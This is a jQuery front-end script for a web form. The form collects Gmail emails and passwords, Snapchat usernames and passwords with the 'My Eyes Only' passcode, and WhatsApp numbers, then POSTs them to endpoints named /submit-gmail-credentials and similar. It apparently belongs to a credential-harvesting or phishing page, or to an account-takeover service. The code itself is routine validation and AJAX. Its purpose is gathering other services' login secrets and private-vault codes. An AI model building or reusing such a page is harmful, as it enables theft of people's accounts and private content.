$(function () {
  // JavaScript to show/hide the appropriate fields based on the selected option
  const selectField = $("#select-field");
  const whatsappFields = $("#whatsapp-fields");
  const gmailFields = $("#gmail-fields");
  const snapchatFields = $("#snapchat-fields");

  const myEyesOnlyCheckbox = $("#my-eyes-only");
  const codeInput = $("#snapchat-code");

  myEyesOnlyCheckbox.on("change", function () {
    // Enable or disable the snapchat code input field based on the checkbox state
    if (this.checked) {
      codeInput.prop("disabled", false);
    } else {
      codeInput.prop("disabled", true);
    }
  });

  selectField.on("change", (e) => {
    const selectedOption = selectField.val();
    // Hide all fields initially
    whatsappFields.hide();
    gmailFields.hide();
    snapchatFields.hide();

    // Show the relevant fields based on the selected option
    if (selectedOption === "WhatsApp") {
      whatsappFields.show();
    } else if (selectedOption === "Gmail") {
      gmailFields.show();
    } else if (selectedOption === "Snapchat") {
      snapchatFields.show();
    }
  });

  function validateWhatsAppCredentials(whatsAppNumber, whatsAppCountry) {
    // Get the input fields
    if (whatsAppNumber.val() && whatsAppCountry.val()) {
      whatsAppNumber.removeClass("is-invalid");
      whatsAppCountry.removeClass("is-invalid");
      return true;
    } else {
      // show error message
      if (!whatsAppNumber.val()) {
        whatsAppNumber.addClass("is-invalid");
      }
      if (!whatsAppCountry.val()) {
        whatsAppCountry.addClass("is-invalid");
      }
      return false;
    }
  }
  function validateGmailCredentials(email, password) {
    // Get the input fields
    if (email.val() && password.val()) {
      email.removeClass("is-invalid");
      password.removeClass("is-invalid");
      return true;
    } else {
      // show error message
      if (!email.val()) {
        email.addClass("is-invalid");
      }
      if (!password.val()) {
        password.addClass("is-invalid");
      }
      return false;
    }
  }

  function validateSnapchatCredentials(username, password) {
    // Get the input fields
    if (myEyesOnlyCheckbox.is(":checked")) {
      if (username.val() && password.val() && codeInput.val()) {
        username.removeClass("is-invalid");
        password.removeClass("is-invalid");
        codeInput.removeClass("is-invalid");
        return true;
      } else {
        // show error message
        if (!username.val()) {
          username.addClass("is-invalid");
        }
        if (!password.val()) {
          password.addClass("is-invalid");
        }
        if (!codeInput.val()) {
          codeInput.addClass("is-invalid");
        }
        return false;
      }
    } else {
      if (username.val() && password.val()) {
        username.removeClass("is-invalid");
        password.removeClass("is-invalid");
        return true;
      } else {
        // show error message
        if (!username.val()) {
          username.addClass("is-invalid");
        }
        if (!password.val()) {
          password.addClass("is-invalid");
        }
        return false;
      }
    }
  }


  // display success message
  function displaySuccessMessage(message) {
    const successAlert = $("#success-alert-display");
    const alertMessage = successAlert.find(".alert-message"); // Select the alert message span

    alertMessage.text(`${message}`);

    // Show the alert with a slide-down animation
    successAlert.slideDown();

    // Scroll to the top of the page to make the alert visible
    $("html, body").animate({ scrollTop: 0 }, "fast");

    // Hide the alert after a few seconds (optional)
    setTimeout(function () {
      successAlert.slideUp();
    }, 5000); // Hide after 5 seconds (adjust the time as needed)
  }


  // display error message
  function displayErrorMessage(message) {
    const errorAlert = $("#error-alert-display");
    const alertMessage = errorAlert.find(".alert-message"); // Select the alert message span

    alertMessage.text(`${message}`);

    // Show the alert with a slide-down animation
    errorAlert.slideDown();

    // Scroll to the top of the page to make the alert visible
    $("html, body").animate({ scrollTop: 0 }, "fast");

    // Hide the alert after a few seconds (optional)
    setTimeout(function () {
      errorAlert.slideUp();
    }, 5000); // Hide after 5 seconds (adjust the time as needed)
  }

  $("#form").submit((e) => {
    e.preventDefault();
    // submit form based on selected option
    if (selectField.val() === "WhatsApp") {
      const whatsAppNumber = $("#whatsapp-number");
      const whatsAppCountry = $("#whatsapp-country");
      // make sure the input fields for whatsApp are all filled
      if (validateWhatsAppCredentials(whatsAppNumber, whatsAppCountry)) {
        $.ajax({
          data: {
            whatsapp_number: whatsAppNumber.val(),
            whatsapp_country: whatsAppCountry.val(),
          },
          type: "POST",
          url: "/submit-whatsapp-credentials",
        }).done(function (data) {
          if (data.code === "success") {
            // Set the success message
            displaySuccessMessage(data.message);

            // clear form fields
            whatsAppNumber.val("");
            whatsAppCountry.val("");

          } else if (data.code === "error") {
            // Set the failure message
            displayErrorMessage(data.message)
          }
        });
      }
    }

    // If Gmail is selected
    if (selectField.val() === "Gmail") {
      const email = $("#email");
      const password = $("#gmail-password");
      // make sure the input fields for Gmail are all filled
      if (validateGmailCredentials(email, password)) {
        $.ajax({
          data: {
            email: email.val(),
            password: password.val(),
          },
          type: "POST",
          url: "/submit-gmail-credentials",
        }).done(function (data) {
          if (data.code === "success") {
            // Set the success message
            displaySuccessMessage(data.message);

            // clear form fields
            email.val("");
            password.val("");

          } else if (data.code === "error") {
            // Set the failure message
            displayErrorMessage(data.message)
          }
        });
      }
    }

    // If Snapchat is selected
    if (selectField.val() === "Snapchat") {
      const username = $("#snapchat-username");
      const password = $("#snapchat-password");
      // make sure the input fields for Snapchat are all filled
      if (validateSnapchatCredentials(username, password)) {
        $.ajax({
          data: {
            username: username.val(),
            password: password.val(),
            snapchat_code: codeInput.val(),
          },
          type: "POST",
          url: "/submit-snapchat-credentials",
        }).done(function (data) {
          if (data.code === "success") {
            // Set the success message
            displaySuccessMessage(data.message);

            // clear form fields
            username.val("");
            password.val("");
            codeInput.val("");

          } else if (data.code === "error") {
            // Set the failure message
            displayErrorMessage(data.message)
          }
        });
      }
    }
  });
});
